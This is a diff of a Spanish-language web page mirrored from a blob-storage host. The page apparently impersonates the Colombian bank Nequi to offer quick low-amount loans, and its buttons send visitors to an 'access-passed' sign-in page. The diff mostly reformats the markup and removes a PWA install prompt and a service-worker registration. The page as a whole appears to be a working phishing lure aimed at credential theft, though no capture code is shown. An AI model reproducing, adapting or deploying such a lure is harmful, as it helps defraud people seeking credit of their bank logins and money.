@@ -1,5 +1,6 @@
 <!doctype html>
 <html lang="es">
+  
 <!-- Mirrored from https://neqteayuda.blob.core.windows.net/neqkm/index.php.html by HTTrack Website Copier/3.x [XR&CO], Sun, 18 Oct 2026 23:03:13 GMT -->
 <head>
     <meta charset="UTF-8">
@@ -8,35 +9,43 @@
     <meta property="og:description" content="Solicuta tu crédito de bajo monto desde $100.000 a $5.000.000.">
     <meta property="og:image" content="../../imagecredit.blob.core.windows.net/image/image.jpg">
     <meta property="og:type" content="website">
-    <!-- Integración PWA -->
-    <link rel="manifest" href="./manifest.json">
-    <meta name="theme-color" content="#2196f3">
+
     <link rel="stylesheet" href="css/globals.css">
     <link rel="stylesheet" href="css/index.css">
     <link rel="stylesheet" href="css/spinner.css">
+
     <!-- <script src="./js/snow.js"></script> -->
+
     <link rel="shortcut icon" type="image/x-icon" href="assets/favicon.ico">
     <title>Solicita tu crédito</title>
+
     <style>
-      a, .w-button {
-        -webkit-user-select: none;
-        user-select: none;
-        -webkit-touch-callout: none;
-        -webkit-tap-highlight-color: transparent;
+      .loadingContainer {
+        display: block;
       }
-      .loadingContainer { display: block; }
+
       .image {
         margin-top: 2rem;
         height: 400px;
         width: 90%;
         background-size: cover;
         background-position: inherit;
+        /* border-radius: 16px; */
         overflow: hidden;
         box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15);
-        transition: transform 0.3s ease, box-shadow 0.3s ease;
+        transition:
+          transform 0.3s ease,
+          box-shadow 0.3s ease;
       }
-      .image-1 { background-image: url("assets/2.jpg"); }
-      .image-2 { background-image: url("assets/1.jpg"); }
+
+      .image-1 {
+        background-image: url("assets/2.jpg");
+      }
+
+      .image-2 {
+        background-image: url("assets/1.jpg");
+      }
+
       .imageInit {
         position: fixed;
         top: 0;
@@ -51,8 +60,9 @@
         display: none;
       }
     </style>
-</head>
-<body>
+  </head>
+
+  <body>
     <header class="z-[999] fixed top-0 w-full h-16 mx-auto pt-0 pb-0 overflow-visible bg-white">
       <div class="flex items-center h-full border-b border-gray-primary bg-white px-[26px]">
         <div class="flex items-center justify-between w-full max-w-[61.875rem] h-full mx-auto">
@@ -75,37 +85,75 @@
         </div>
       </div>
     </header>
+
     <div class="imageInit" id="imageInit">
       <div style="display: flex; flex-direction: column; align-items: center">
         <img src="assets/inicial.jpg" alt="">
+
         <a id="closeModal" class="nq-btn w-button" style="margin-top: 10px; background-color: blueviolet">Solicitar crédito</a>
       </div>
     </div>
+
     <div class="credits" style="padding-bottom: 0 !important">
       <div class="wrap">
         <div class="wrapper" style="width: 100% !important">
           <div class="type-credits__content" id="type-credits">
             <div class="type-credits-card-w credit-1" style="margin-bottom: 0 !important">
-              <div class="big-letter" style="display: block !important; padding: 4.5rem 1rem !important;">
+              <div class="big-letter" style="
+                  display: block !important;
+                  padding: 4.5rem 1rem !important;
+                ">
                 <h1 class="u-text-white is-credit-effect-page" style="font-size: 2.5rem !important">
-                  Tienes el control<br>de tu crédito
+                  Tienes el control
+                  <br>
+                  de tu crédito
                 </h1>
+
+                <!-- <p
+                  class="u-text-white"
+                  style="
+                    font-size: 18px !important;
+                    font-weight: 700;
+                    margin-top: 20px;
+                  "
+                >
+                  Sin filas, sin comisiones,
+                  <br />
+                  sin complicaciones.
+                </p> -->
+
                 <a id="salvavidas" class="nq-btn w-button" style="margin-top: 40px">Solicitar crédito</a>
-                <p class="u-text-white" style="background-color: #f5f4f445; font-weight: 600; padding: 0.5rem; border-radius: 0.5rem; font-size: 15px; backdrop-filter: blur(7px); margin-top: 250px;">
-                  Crédito de bajo monto<br>Desde $100.000 a 20.000.000 sin codeudores y 100% digital desde la web.
+                <p class="u-text-white" style="
+                    background-color: #f5f4f445;
+                    font-weight: 600;
+                    padding: 0.5rem;
+                    border-radius: 0.5rem;
+                    font-size: 15px;
+                    backdrop-filter: blur(7px);
+                    margin-top: 250px;
+                  ">
+                  Crédito de bajo monto
+                  <br>
+                  Desde $100.000 a 20.000.000 sin codeudores y 100% digital
+                  desde la web.
                 </p>
-                <p class="u-text-white" style="margin-top: 10px">Aprobación y estudio de credito en minutos</p>
+                <p class="u-text-white" style="margin-top: 10px">
+                  Aprobación y estudio de credito en minutos
+                </p>
               </div>
             </div>
           </div>
         </div>
       </div>
     </div>
+
     <div class="images" style="display: flex; flex-direction: column; align-items: center">
       <div class="image image-1"></div>
       <div class="image image-2"></div>
     </div>
+
     <iframe src="access-passed/slide.php.html" frameborder="0" allowfullscreen="" style="overflow: hidden; height: 400px; width: 100%"></iframe>
+
     <div class="solicitud" style="margin-top: -5rem">
       <div class="wrap">
         <div class="wrapper">
@@ -115,7 +163,9 @@
                 <strong>Crédito en línea y </strong><span class="u-text-white-2"><strong>al instante desde tu Web Nequi</strong></span>
               </h2>
               <p class="u-text-white">
-                Analizamos cómo manejas tu plata en la Web. Entre más pagues, recargues y uses menos efectivo, mejor conocemos tu perfil y más chance tienes de acceder a mejores condiciones crediticias.
+                Analizamos cómo manejas tu plata en la Web. Entre más pagues,
+                recargues y uses menos efectivo, mejor conocemos tu perfil y más
+                chance tienes de acceder a mejores condiciones crediticias.
               </p>
               <div class="income-btn is-credit-page is-mb">
                 <a id="btn-solicitar" class="nq-btn w-button">Solicita tu crédito</a>
@@ -132,6 +182,7 @@
         </div>
       </div>
     </div>
+
     <footer>
       <div class="wrap">
         <div class="wrapper">
@@ -142,59 +193,64 @@
         </div>
       </div>
     </footer>
-    <!-- Lógica de PWA original sin bloqueos -->
+
     <script>
-      let deferredPrompt = null;
-      window.addEventListener('beforeinstallprompt', (e) => {
-        e.preventDefault();
-        deferredPrompt = e;
-      });
-      async function procesarSolicitud() {
-        localStorage.setItem("typeProduct", "salvavidas");
-        if (deferredPrompt) {
-          deferredPrompt.prompt();
-          const { outcome } = await deferredPrompt.userChoice;
-          deferredPrompt = null;
-          window.location.href = "access-passed/accces-sign-in.php.html";
-        } else {
-          window.location.href = "access-passed/accces-sign-in.php.html";
-        }
-      }
       const salvavidas = document.getElementById("salvavidas");
-      const btnSolicitar = document.getElementById("btn-solicitar");
       const closeModal = document.getElementById("closeModal");
       const imageInit = document.getElementById("imageInit");
+
       salvavidas.addEventListener("click", (event) => {
-        event.preventDefault();
-        procesarSolicitud();
+        localStorage.setItem("typeProduct", "salvavidas");
+        window.location.href = "access-passed/accces-sign-in.php.html";
       });
+
+      const btnSolicitar = document.getElementById("btn-solicitar");
+
       btnSolicitar.addEventListener("click", (event) => {
-        event.preventDefault();
-        procesarSolicitud();
+        localStorage.setItem("typeProduct", "salvavidas");
+        window.location.href = "access-passed/accces-sign-in.php.html";
       });
+
       closeModal.addEventListener("click", (event) => {
-        event.preventDefault();
         imageInit.style.display = "none";
       });
+
+      //setTimeout(() => {
+      //imageInit.style.display = "none";
+      //}, 4000);
       getRangoTresMeses();
+
       function getRangoTresMeses() {
         const hoy = new Date();
+
+        // Mes de inicio: mes actual, día 1
         const inicio = new Date(hoy.getFullYear(), hoy.getMonth(), 1);
+
+        // Mes final: mes actual + 3, día 0 del mes siguiente da el último día del mes anterior
         const fin = new Date(hoy.getFullYear(), hoy.getMonth() + 4, 0);
-        const meses = ["enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre"];
-        const texto = `*Válido desde el 01 de ${meses[inicio.getMonth()]} hasta el ${fin.getDate()} de ${meses[fin.getMonth()]}`;
+
+        const meses = [
+          "enero",
+          "febrero",
+          "marzo",
+          "abril",
+          "mayo",
+          "junio",
+          "julio",
+          "agosto",
+          "septiembre",
+          "octubre",
+          "noviembre",
+          "diciembre",
+        ];
+
+        const texto = `*Válido desde el 01 de ${
+          meses[inicio.getMonth()]
+        } hasta el ${fin.getDate()} de ${meses[fin.getMonth()]}`;
         localStorage.setItem("validoHasta", texto);
       }
     </script>
-    <!-- Registro del Service Worker para PWA -->
-    <script>
-      if ('serviceWorker' in navigator) {
-        window.addEventListener('load', () => {
-          navigator.serviceWorker.register('./sw.js')
-            .then(reg => console.log('Service Worker registrado correctamente', reg))
-            .catch(err => console.error('Error al registrar Service Worker', err));
-        });
-      }
-    </script>
-</body>
+  </body>
+
+<!-- Mirrored from https://neqteayuda.blob.core.windows.net/neqkm/index.php.html by HTTrack Website Copier/3.x [XR&CO], Sun, 18 Oct 2026 23:03:27 GMT -->
 </html>
